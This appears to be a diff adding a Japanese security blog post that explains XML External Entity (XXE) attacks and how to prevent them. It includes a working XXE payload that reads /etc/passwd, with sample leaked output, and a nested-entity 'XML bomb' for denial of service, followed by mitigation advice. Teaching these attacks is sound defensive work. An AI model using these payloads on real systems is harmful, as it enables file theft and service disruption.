@@ -1,0 +1,68 @@
+---
+layout: ../../../layouts/Layout.astro
+pubDate: "2025-01-28"
+updatedDate: "2025-01-28"
+title: "XML External Entity（XXE）の攻撃手法と対策"
+author: ダーシノ
+description: "XML External Entity（XXE）とは、XMLドキュメントのEntity定義を悪用し外部のファイルを参照することでサーバー内などにある機密情報を抜き取ったり、External Entityを利用したDoS攻撃を行う攻撃手法のこと。"
+tags: ["Security"]
+---
+
+import Header from '../../../components/Header.astro'
+
+<Header {...frontmatter} />
+
+
+## 概要
+
+XML External Entity（XXE）とは、XMLドキュメントのEntity定義を悪用し外部のファイルを参照することでサーバー内などにある機密情報を抜き取ったり、External Entityを利用したDoS攻撃を行う攻撃手法のこと。
+
+## 攻撃方法の例
+
+### 1. サーバー内のファイルを読み込む
+
+以下のようなXMLファイルをアップロードした場合、`file:///etc/passwd`というファイルを読み込むことができる。
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY name SYSTEM "file:///etc/passwd">
+]>
+<top><name>&name;</name></top>
+```
+
+このXMLデータを解析すると、以下のような`/etc/passwd`ファイルの内容が取得できる。
+
+```html
+<p>
+  Your name is: root:x:0:0:root:/root:/bin/ash bin:x:1:1:bin:/bin:/sbin/nologin
+  (省略) nobody:x:65534:65534:nobody:/:/sbin/nologin www-data:x:82:82:Linux
+  User,,,:/home/www-data:/sbin/nologin
+</p>
+```
+
+### 2. Denial of Service（Dos）攻撃
+
+以下のXMLを解析すると、参照をたどり展開されることで `dos` とう文字列が3の4乗、つまり81回繰り返されることになる。これを用いることで、DoS攻撃に利用ができる。（「XML Bomb」などとも呼ばれる）
+
+```xml
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE root [
+<!ENTITY b0 "dos" >
+<!ENTITY b1 "&b0;&b0;&b0;">
+<!ENTITY b2 "&b1;&b1;&b1;">
+<!ENTITY b3 "&b2;&b2;&b2;">
+<!ENTITY b4 "&b3;&b3;&b3;">
+]>
+<root>&b4;</root>
+```
+
+## 対策
+
+### 1. XMLを利用しない
+
+前提としてXMLを利用しないことで、XXE脆弱性についての問題は解消される。データ参照の機能がないJSONやプレーンテキストなどを検討することが推奨される。
+
+### 2. XMLの機能を制限する
+
+External Entityに適切なバリデーションを行ったり、無効化（解釈しない）したり、XXE対策がされたXMLパーサーを使用する。
